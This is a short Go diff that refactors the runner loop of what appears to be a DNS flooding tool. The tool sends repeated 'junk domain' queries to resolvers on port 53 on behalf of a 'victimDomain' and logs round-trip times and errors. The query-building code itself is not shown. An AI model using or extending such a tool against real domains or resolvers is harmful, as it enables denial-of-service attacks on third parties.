@@ -14,7 +14,6 @@ import (
 type Launcher struct {
 	nRoutines    int
 	nQuestions   int
-	hostPort     string
 	ipAddresses  []net.IP
 	victimDomain string
 	sleepTime    *time.Duration
@@ -52,9 +51,9 @@ func (l *Launcher) Initialize() {
 }
 
 func (l *Launcher) runner(ipString string) {
-	fullAddress := fmt.Sprintf("%s:53", ipString)
+	client := NewDNSClient(fmt.Sprintf("%s:53", ipString))
 	for {
-		rtt, dnsErr, err := NewDNSClient(fullAddress).SendJunkDomainsRequest(l.nQuestions, l.victimDomain)
+		rtt, dnsErr, err := client.SendJunkDomainsRequest(l.nQuestions, l.victimDomain)
 		errorMessage := "none"
 		if err != nil {
 			errorMessage = err.Error()
@@ -62,7 +61,7 @@ func (l *Launcher) runner(ipString string) {
 		if dnsErr == "" {
 			dnsErr = "none"
 		}
-		log.Printf("RTT: %s, DNS_ERR: %s, NET_ERR: %s", rtt.String(), dnsErr, errorMessage)
+		log.Printf("RTT: %-12s, DNS_ERR: %-8s, NET_ERR: %s", rtt.String(), dnsErr, errorMessage)
 		if l.sleepTime != nil {
 			time.Sleep(*l.sleepTime)
 		}
